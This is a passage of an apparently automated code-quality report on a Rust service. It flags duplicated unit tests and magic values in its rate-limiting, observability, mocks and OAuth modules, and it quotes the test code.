        assert!(service.check("user_b", None).allowed);
        assert!(!service.check("user_b", None).allowed);

        // Verify both are tracked
        assert_eq!(service.tracked_identities(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 487

**Code:**
```
    fn test_per_identity_isolation() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit for user A
        assert!(service.check("user_a", None).allowed);
        assert!(!service.check("user_a", None).allowed);

        // User B should still have their own bucket
        assert!(service.check("user_b", None).allowed);
        assert!(!service.check("user_b", None).allowed);

        // Verify both are tracked
        assert_eq!(service.tracked_identities(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 487

**Code:**
```
    fn test_per_identity_isolation() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit for user A
        assert!(service.check("user_a", None).allowed);
        assert!(!service.check("user_a", None).allowed);

        // User B should still have their own bucket
        assert!(service.check("user_b", None).allowed);
        assert!(!service.check("user_b", None).allowed);

        // Verify both are tracked
        assert_eq!(service.tracked_identities(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 505

**Code:**
```
    fn test_custom_rate_limit() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Default user with burst=1 gets exactly 1 request
        assert!(service.check("default_user", None).allowed);
        assert!(!service.check("default_user", None).allowed);

        // VIP user with custom limit of 10 rps
        // burst is 50% of rps = 5, so should handle 5 instant requests
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);

        // 6th request should be limited
        assert!(!service.check("vip_user", Some(10)).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 505

**Code:**
```
    fn test_custom_rate_limit() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Default user with burst=1 gets exactly 1 request
        assert!(service.check("default_user", None).allowed);
        assert!(!service.check("default_user", None).allowed);

        // VIP user with custom limit of 10 rps
        // burst is 50% of rps = 5, so should handle 5 instant requests
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);

        // 6th request should be limited
        assert!(!service.check("vip_user", Some(10)).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 505

**Code:**
```
    fn test_custom_rate_limit() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Default user with burst=1 gets exactly 1 request
        assert!(service.check("default_user", None).allowed);
        assert!(!service.check("default_user", None).allowed);

        // VIP user with custom limit of 10 rps
        // burst is 50% of rps = 5, so should handle 5 instant requests
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);

        // 6th request should be limited
        assert!(!service.check("vip_user", Some(10)).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 505

**Code:**
```
    fn test_custom_rate_limit() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Default user with burst=1 gets exactly 1 request
        assert!(service.check("default_user", None).allowed);
        assert!(!service.check("default_user", None).allowed);

        // VIP user with custom limit of 10 rps
        // burst is 50% of rps = 5, so should handle 5 instant requests
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);

        // 6th request should be limited
        assert!(!service.check("vip_user", Some(10)).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 505

**Code:**
```
    fn test_custom_rate_limit() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Default user with burst=1 gets exactly 1 request
        assert!(service.check("default_user", None).allowed);
        assert!(!service.check("default_user", None).allowed);

        // VIP user with custom limit of 10 rps
        // burst is 50% of rps = 5, so should handle 5 instant requests
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);

        // 6th request should be limited
        assert!(!service.check("vip_user", Some(10)).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 527

**Code:**
```
    fn test_clear_identity() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit
        assert!(service.check("user", None).allowed);
        assert!(!service.check("user", None).allowed);

        // Clear the identity
        service.clear_identity("user");
        assert_eq!(service.tracked_identities(), 0);

        // User should get a fresh bucket
        assert!(service.check("user", None).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 527

**Code:**
```
    fn test_clear_identity() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit
        assert!(service.check("user", None).allowed);
        assert!(!service.check("user", None).allowed);

        // Clear the identity
        service.clear_identity("user");
        assert_eq!(service.tracked_identities(), 0);

        // User should get a fresh bucket
        assert!(service.check("user", None).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 527

**Code:**
```
    fn test_clear_identity() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit
        assert!(service.check("user", None).allowed);
        assert!(!service.check("user", None).allowed);

        // Clear the identity
        service.clear_identity("user");
        assert_eq!(service.tracked_identities(), 0);

        // User should get a fresh bucket
        assert!(service.check("user", None).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 527

**Code:**
```
    fn test_clear_identity() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Exhaust rate limit
        assert!(service.check("user", None).allowed);
        assert!(!service.check("user", None).allowed);

        // Clear the identity
        service.clear_identity("user");
        assert_eq!(service.tracked_identities(), 0);

        // User should get a fresh bucket
        assert!(service.check("user", None).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 545

**Code:**
```
    fn test_check_allowed_backwards_compat() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // check_allowed should return simple bool
        assert!(service.check_allowed("user", None));
        assert!(!service.check_allowed("user", None));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 545

**Code:**
```
    fn test_check_allowed_backwards_compat() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // check_allowed should return simple bool
        assert!(service.check_allowed("user", None));
        assert!(!service.check_allowed("user", None));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 545

**Code:**
```
    fn test_check_allowed_backwards_compat() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // check_allowed should return simple bool
        assert!(service.check_allowed("user", None));
        assert!(!service.check_allowed("user", None));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 572

**Code:**
```
    fn test_ttl_cleanup() {
        let config = test_config(true, 10, 10);
        // Set TTL to 0 so entries are immediately expired
        let service = RateLimitService::new(&config).with_ttl(Duration::ZERO);

        // Create entries for multiple users
        service.check("user_a", None);
        service.check("user_b", None);
        service.check("user_c", None);

        assert_eq!(service.tracked_identities(), 3);

        // Cleanup should remove all expired entries
        service.cleanup_expired();

        assert_eq!(service.tracked_identities(), 0);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 572

**Code:**
```
    fn test_ttl_cleanup() {
        let config = test_config(true, 10, 10);
        // Set TTL to 0 so entries are immediately expired
        let service = RateLimitService::new(&config).with_ttl(Duration::ZERO);

        // Create entries for multiple users
        service.check("user_a", None);
        service.check("user_b", None);
        service.check("user_c", None);

        assert_eq!(service.tracked_identities(), 3);

        // Cleanup should remove all expired entries
        service.cleanup_expired();

        assert_eq!(service.tracked_identities(), 0);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 592

**Code:**
```
    fn test_ttl_preserves_active_entries() {
        let config = test_config(true, 10, 10);
        // Set a longer TTL
        let service = RateLimitService::new(&config).with_ttl(Duration::from_secs(3600));

        // Create entries for multiple users
        service.check("user_a", None);
        service.check("user_b", None);

        assert_eq!(service.tracked_identities(), 2);

        // Cleanup should preserve entries that haven't expired
        service.cleanup_expired();

        assert_eq!(service.tracked_identities(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 626

**Code:**
```
    fn test_tool_rate_limit_disabled() {
        let config = RateLimitConfig {
            enabled: false,
            requests_per_second: 100,
            burst_size: 50,
            tool_limits: vec![ToolRateLimitConfig {
                tool_pattern: "execute_*".to_string(),
                requests_per_second: 5,
                burst_size: 2,
            }],
        };
        let service = RateLimitService::new(&config);

        // Should return None when disabled
        assert!(service.check_tool("user", "execute_code").is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 626

**Code:**
```
    fn test_tool_rate_limit_disabled() {
        let config = RateLimitConfig {
            enabled: false,
            requests_per_second: 100,
            burst_size: 50,
            tool_limits: vec![ToolRateLimitConfig {
                tool_pattern: "execute_*".to_string(),
                requests_per_second: 5,
                burst_size: 2,
            }],
        };
        let service = RateLimitService::new(&config);

        // Should return None when disabled
        assert!(service.check_tool("user", "execute_code").is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 626

**Code:**
```
    fn test_tool_rate_limit_disabled() {
        let config = RateLimitConfig {
            enabled: false,
            requests_per_second: 100,
            burst_size: 50,
            tool_limits: vec![ToolRateLimitConfig {
                tool_pattern: "execute_*".to_string(),
                requests_per_second: 5,
                burst_size: 2,
            }],
        };
        let service = RateLimitService::new(&config);

        // Should return None when disabled
        assert!(service.check_tool("user", "execute_code").is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 626

**Code:**
```
    fn test_tool_rate_limit_disabled() {
        let config = RateLimitConfig {
            enabled: false,
            requests_per_second: 100,
            burst_size: 50,
            tool_limits: vec![ToolRateLimitConfig {
                tool_pattern: "execute_*".to_string(),
                requests_per_second: 5,
                burst_size: 2,
            }],
        };
        let service = RateLimitService::new(&config);

        // Should return None when disabled
        assert!(service.check_tool("user", "execute_code").is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 645

**Code:**
```
    fn test_per_tool_rate_limit_basic() {
        let config = RateLimitConfig {
            enabled: true,
            requests_per_second: 100,
            burst_size: 50,
            tool_limits: vec![ToolRateLimitConfig {
                tool_pattern: "execute_code".to_string(),
                requests_per_second: 2,
                burst_size: 2,
            }],
        };
        let service = RateLimitService::new(&config);

        assert!(service.has_tool_limits());
        assert_eq!(service.tracked_tools(), 0);

        // First 2 requests within burst should succeed
        let result1 = service.check_tool("user", "execute_code").unwrap();
        assert!(result1.allowed);
        assert_eq!(result1.limit, 2);

        let result2 = service.check_tool("user", "execute_code").unwrap();
        assert!(result2.allowed);

        // 3rd request should be denied
        let result3 = service.check_tool("user", "execute_code").unwrap();
        assert!(!result3.allowed);
        assert!(result3.retry_after_secs.is_some());

        // Verify tool limiter is tracked
        assert_eq!(service.tracked_tools(), 1);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 645

**Code:**
```
    fn test_per_tool_rate_limit_basic() {
        let config = RateLimitConfig {
            enabled: true,
            requests_per_second: 100,
            burst_size: 50,
            tool_limits: vec![ToolRateLimitConfig {
                tool_pattern: "execute_code".to_string(),
                requests_per_second: 2,
                burst_size: 2,
            }],
        };
        let service = RateLimitService::new(&config);

        assert!(service.has_tool_limits());
        assert_eq!(service.tracked_tools(), 0);

        // First 2 requests within burst should succeed
        let result1 = service.check_tool("user", "execute_code").unwrap();
        assert!(result1.allowed);
        assert_eq!(result1.limit, 2);

        let result2 = service.check_tool("user", "execute_code").unwrap();
        assert!(result2.allowed);

        // 3rd request should be denied
        let result3 = service.check_tool("user", "execute_code").unwrap();
        assert!(!result3.allowed);
        assert!(result3.retry_after_secs.is_some());

        // Verify tool limiter is tracked
        assert_eq!(service.tracked_tools(), 1);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 645

**Code:**
```
    fn test_per_tool_rate_limit_basic() {
        let config = RateLimitConfig {
            enabled: true,
            requests_per_second: 100,
            burst_size: 50,
            tool_limits: vec![ToolRateLimitConfig {
                tool_pattern: "execute_code".to_string(),
                requests_per_second: 2,
                burst_size: 2,
            }],
        };
        let service = RateLimitService::new(&config);

        assert!(service.has_tool_limits());
        assert_eq!(service.tracked_tools(), 0);

        // First 2 requests within burst should succeed
        let result1 = service.check_tool("user", "execute_code").unwrap();
        assert!(result1.allowed);
        assert_eq!(result1.limit, 2);

        let result2 = service.check_tool("user", "execute_code").unwrap();
        assert!(result2.allowed);

        // 3rd request should be denied
        let result3 = service.check_tool("user", "execute_code").unwrap();
        assert!(!result3.allowed);
        assert!(result3.retry_after_secs.is_some());

        // Verify tool limiter is tracked
        assert_eq!(service.tracked_tools(), 1);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 680

**Code:**
```
    fn test_per_tool_rate_limit_pattern_matching() {
        let config = RateLimitConfig {
            enabled: true,
            requests_per_second: 100,
            burst_size: 50,
            tool_limits: vec![
                ToolRateLimitConfig {
                    tool_pattern: "execute_*".to_string(),
                    requests_per_second: 2,
                    burst_size: 2,
                },
                ToolRateLimitConfig {
                    tool_pattern: "write_*".to_string(),
                    requests_per_second: 5,
                    burst_size: 3,
                },
            ],
        };
        let service = RateLimitService::new(&config);

        // execute_* pattern should match execute_code
        let result = service.check_tool("user", "execute_code").unwrap();
        assert!(result.allowed);
        assert_eq!(result.limit, 2);

        // execute_* pattern should match execute_shell
        let result = service.check_tool("user", "execute_shell").unwrap();
        assert!(result.allowed);
        assert_eq!(result.limit, 2);

        // write_* pattern should match write_file
        let result = service.check_tool("user", "write_file").unwrap();
        assert!(result.allowed);
        assert_eq!(result.limit, 5);

        // read_file should not match any pattern
        assert!(service.check_tool("user", "read_file").is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 680

**Code:**
```
    fn test_per_tool_rate_limit_pattern_matching() {
        let config = RateLimitConfig {
            enabled: true,
            requests_per_second: 100,
            burst_size: 50,
            tool_limits: vec![
                ToolRateLimitConfig {
                    tool_pattern: "execute_*".to_string(),
                    requests_per_second: 2,
                    burst_size: 2,
                },
                ToolRateLimitConfig {
                    tool_pattern: "write_*".to_string(),
                    requests_per_second: 5,
                    burst_size: 3,
                },
            ],
        };
        let service = RateLimitService::new(&config);

        // execute_* pattern should match execute_code
        let result = service.check_tool("user", "execute_code").unwrap();
        assert!(result.allowed);
        assert_eq!(result.limit, 2);

        // execute_* pattern should match execute_shell
        let result = service.check_tool("user", "execute_shell").unwrap();
        assert!(result.allowed);
        assert_eq!(result.limit, 2);

        // write_* pattern should match write_file
        let result = service.check_tool("user", "write_file").unwrap();
        assert!(result.allowed);
        assert_eq!(result.limit, 5);

        // read_file should not match any pattern
        assert!(service.check_tool("user", "read_file").is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 721

**Code:**
```
    fn test_tool_rate_limit_per_identity() {
        let config = RateLimitConfig {
            enabled: true,
            requests_per_second: 100,
            burst_size: 50,
            tool_limits: vec![ToolRateLimitConfig {
                tool_pattern: "execute_*".to_string(),
                requests_per_second: 1,
                burst_size: 1,
            }],
        };
        let service = RateLimitService::new(&config);

        // User A exhausts their tool limit
        assert!(service.check_tool("user_a", "execute_code").unwrap().allowed);
        assert!(!service.check_tool("user_a", "execute_code").unwrap().allowed);

        // User B should have their own independent limiter
        assert!(service.check_tool("user_b", "execute_code").unwrap().allowed);
        assert!(!service.check_tool("user_b", "execute_code").unwrap().allowed);

        // Two tool limiters should be tracked (user_a:execute_code, user_b:execute_code)
        assert_eq!(service.tracked_tools(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.4% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 505

**Code:**
```
    fn test_custom_rate_limit() {
        let config = test_config(true, 1, 1);
        let service = RateLimitService::new(&config);

        // Default user with burst=1 gets exactly 1 request
        assert!(service.check("default_user", None).allowed);
        assert!(!service.check("default_user", None).allowed);

        // VIP user with custom limit of 10 rps
        // burst is 50% of rps = 5, so should handle 5 instant requests
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);
        assert!(service.check("vip_user", Some(10)).allowed);

        // 6th request should be limited
        assert!(!service.check("vip_user", Some(10)).allowed);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.1% similarity.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 471

**Code:**
```
    fn test_rate_limit_enabled() {
        let config = test_config(true, 1, 2);
        let service = RateLimitService::new(&config);

        // First requests within burst should succeed
        assert!(service.check("test", None).allowed);
        assert!(service.check("test", None).allowed);

        // Next request should be rate limited
        let result = service.check("test", None);
        assert!(!result.allowed);
        assert!(result.retry_after_secs.is_some());
    }
```

---

#### Magic value '0.5' used in comparison operation (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 181

---

#### Magic value '0.5' used in comparison operation (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 306

---

#### Magic value '"user"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 536

---

#### Magic value '"user"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 561

---

#### Magic value '"user"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 562

---

#### Magic value '"user_a"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 578

---

#### Magic value '"user_b"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 579

---

#### Magic value '"user_c"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 580

---

#### Magic value '"user_a"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 598

---

#### Magic value '"user_b"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 599

---

#### Magic value '"user"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 662

---

#### Magic value '"execute_code"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 662

---

#### Magic value '"user"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 666

---

#### Magic value '"execute_code"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 666

---

#### Magic value '"user"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 670

---

#### Magic value '"execute_code"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 670

---

#### Magic value '"user"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 701

---

#### Magic value '"execute_code"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 701

---

#### Magic value '"user"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 706

---

#### Magic value '"execute_shell"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 706

---

#### Magic value '"user"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 711

---

#### Magic value '"write_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 711

---

#### Magic value '"user_a"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 762

---

#### Magic value '"execute_code"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 762

---

#### Magic value '"user_b"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 763

---

#### Magic value '"execute_shell"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 763

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 314

**Code:**
```
    fn test_record_functions_dont_panic() {
        // These functions should not panic even without a recorder installed
        // (metrics crate provides a no-op recorder by default)
        record_request("POST", 200, std::time::Duration::from_millis(50));
        record_auth("api_key", true);
        record_auth("jwt", false);
        record_rate_limit(true);
        record_rate_limit(false);
        set_active_identities(5);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_init_tracing_basic() {
        // Should initialize basic logging without panic
        let guard = init_tracing(true, None);
        // Guard scope end should drop safely
        drop(guard);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 402

**Code:**
```
    fn test_tracing_config_sample_rate_boundaries() {
        // Test sample rate 0.0 (always off)
        let config = TracingConfig {
            enabled: true,
            sample_rate: 0.0,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 0.0);
        
        // Test sample rate 1.0 (always on)
        let config = TracingConfig {
            enabled: true,
            sample_rate: 1.0,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 1.0);
        
        // Test middle value
        let config = TracingConfig {
            enabled: true,
            sample_rate: 0.5,
            ..Default::default()
        };
        assert_eq!(config.sample_rate, 0.5);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.3% similarity.

- **File:** `src/observability/mod.rs`
- **Line:** 334

**Code:**
```
    fn test_create_metrics_handle() {
        // Should create a local metrics handle without panicking
        let handle = create_metrics_handle();
        // Should be able to render metrics (may be empty)
        let metrics = handle.render();
        // Metrics string should be valid (not panicking is the main test)
        assert!(metrics.is_empty() || !metrics.is_empty());
    }
```

---

#### Magic value '"service.name"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/observability/mod.rs`
- **Line:** 106

---

#### Magic value '"service.version"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/observability/mod.rs`
- **Line:** 107

---

#### Magic value '"POST"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/observability/mod.rs`
- **Line:** 317

---

#### Magic value '"api_key"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/observability/mod.rs`
- **Line:** 318

---

#### Magic value '"POST"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/observability/mod.rs`
- **Line:** 346

---

#### Magic value '20' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/observability/mod.rs`
- **Line:** 346

---

#### Magic value '"DELETE"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/observability/mod.rs`
- **Line:** 347

---

#### Magic value '15' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/observability/mod.rs`
- **Line:** 348

---

#### Magic value '"PATCH"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/observability/mod.rs`
- **Line:** 349

---

#### Magic value '"api_key"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/observability/mod.rs`
- **Line:** 354

---

#### Magic value '"oauth"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/observability/mod.rs`
- **Line:** 356

---

#### Magic value '"mtls"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/observability/mod.rs`
- **Line:** 357

---

#### Magic value '"api_key"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/observability/mod.rs`
- **Line:** 358

---

#### Magic value '"status"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/mocks.rs`
- **Line:** 169

---

#### Magic value '"test/method"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/mocks.rs`
- **Line:** 173

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 493

**Code:**
```
    fn test_provider_creation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(provider.name(), "oauth");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 493

**Code:**
```
    fn test_provider_creation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(provider.name(), "oauth");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 500

**Code:**
```
    fn test_github_endpoints() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(
            provider.authorization_url,
            "https://github.com/login/oauth/authorize"
        );
        assert_eq!(
            provider.token_url,
            "https://github.com/login/oauth/access_token"
        );
        assert_eq!(provider.userinfo_url, "https://api.github.com/user");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 605

**Code:**
```
    fn test_scope_to_tool_mapping() {
        let mut scope_mapping = HashMap::new();
        scope_mapping.insert("read:files".to_string(), vec!["read_file".to_string()]);
        scope_mapping.insert("write:files".to_string(), vec!["write_file".to_string()]);

        let tools = map_scopes_to_tools(
            &["read:files".to_string(), "write:files".to_string()],
            &scope_mapping,
        );
        assert!(tools.is_some());
        let tools = tools.unwrap();
        assert!(tools.contains(&"read_file".to_string()));
        assert!(tools.contains(&"write_file".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.4% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 536

**Code:**
```
    fn test_custom_provider_requires_urls() {
        let config = OAuthConfig {
            provider: OAuthProviderType::Custom,
